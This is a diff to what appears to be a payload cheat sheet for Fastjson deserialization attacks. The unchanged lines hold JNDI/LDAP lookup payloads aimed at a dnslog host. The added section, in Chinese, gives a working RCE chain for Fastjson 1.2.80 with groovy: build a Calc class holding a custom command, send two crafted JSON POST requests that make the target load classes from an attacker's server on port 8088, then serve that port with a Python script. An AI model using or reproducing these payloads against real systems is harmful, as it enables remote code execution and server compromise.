@@ -68,3 +68,39 @@ FUZZ:
 {"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://fast.bugseek.dnslog.cn/Calc"], "Realms":[""]}
 {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
 {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
+
+1.2.80 + groovy 实现RCE
+1、第一步：准备Calc.class
+
+IDEA打开https://github.com/Lonely-night/fastjsonVul/attack模块，Maven导入项目，然后创建Calc.java，自定义命令后Mvn编译。
+mvn clean package -DskipTests=true -X
+
+2、EXP如下
+POST /drpxxxonal/xxxx HTTP/1.1
+Host: xxxx-xxx
+Content-Type: application/json
+Content-Length: 418
+
+
+{
+"\x40type":"java.lang.Exception",
+"\x40type":"org.codehaus.groovy.control.CompilationFailedException",
+"unit":{}
+}
+
+
+POST /xxx/xxxxyCode HTTP/1.1
+Host: x-xxx.xxx.com
+Content-Type: application/json
+Content-Length: 524
+
+
+{
+"\x40type":"org.codehaus.groovy.control.ProcessingUnit",
+"\x40type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
+"config":{
+"\x40type":"org.codehaus.groovy.control.CompilerConfiguration",
+"classpathList":"http://xxxxxxxx:8088/"
+}
+}
+3、使用python脚本运行http端口8088 即可打
